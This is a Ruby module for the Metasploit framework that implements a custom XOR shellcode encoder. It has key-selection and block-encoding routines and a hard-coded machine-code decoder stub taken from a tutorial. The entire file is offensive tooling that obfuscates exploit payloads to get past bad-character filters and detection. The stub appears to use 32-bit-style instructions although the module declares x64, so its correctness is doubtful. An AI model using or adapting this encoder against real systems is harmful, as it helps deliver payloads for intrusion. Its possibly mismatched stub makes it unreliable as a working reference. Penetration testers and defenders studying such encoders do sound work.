##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder

  def initialize
    super(
      'Name'             => 'XOR CUSTOM',
      'Description'      => 'An Custom XOR encoder.',
      'Author'           => [ 'Solaris Red Ninja' ],
      'Arch'             => ARCH_X64,
      'License'          => MSF_LICENSE,
      'Decoder'          =>
        {
          'BlockSize'      => 2
        }
      )
  end

  def find_valid_byte(bad_bytes)
    key = rand(1..255)
    if bad_bytes.include? key
      return false
    else
      return key
    end
  end

  def xor_bytes(key, chunk, bad_bytes)
    xored_bytes = chunk.map { |byte| byte ^ key }.pack('C*')
    xored_bytes.each_byte do |byte|
      if bad_bytes.include? byte
        return false
      end
    end
    return xored_bytes.bytes.unshift(key).pack('C*')
  end

  def decoder_stub(state)

    decoder =
      # https://rastating.github.io/creating-a-custom-shellcode-encoder/
      "\x31\xc0\x31\xdb\x31\xc9\x31\xd2" +
      "\xb2\x45\xeb\x1f\x5e\x8d\x3e\x8a" +
      "\x1c\x0f\x88\xdf\x88\xd0\x30\xd8" +
      "\x74\x16\x66\x8b\x44\x0f\x01\x66" +
      "\x31\xd8\x66\x89\x07\x41\x8d\x7f" +
      "\x02\xeb\xe4\xe8\xdc\xff\xff\xff"

    state.context = ''

    # loop until we get valid eof byte
    @eof_byte = false
    until @eof_byte
      @eof_byte = find_valid_byte(state.badchars.bytes)
    end

    # replace decoder stub byte location with eof byte
    decoder[9,1] = @eof_byte.chr
    return decoder
  end

  def encode_block(state, block)
    encoded = false
    bad_bytes = state.badchars.bytes.push(@eof_byte)

    until encoded
      next if !key = find_valid_byte(bad_bytes)
      next if !encoded = xor_bytes(key, block.bytes, bad_bytes)
    end

    return encoded
  end

  def encode_end(state)
    # append eof byte at the end of encoded payload
    state.encoded += @eof_byte.chr
  end
end
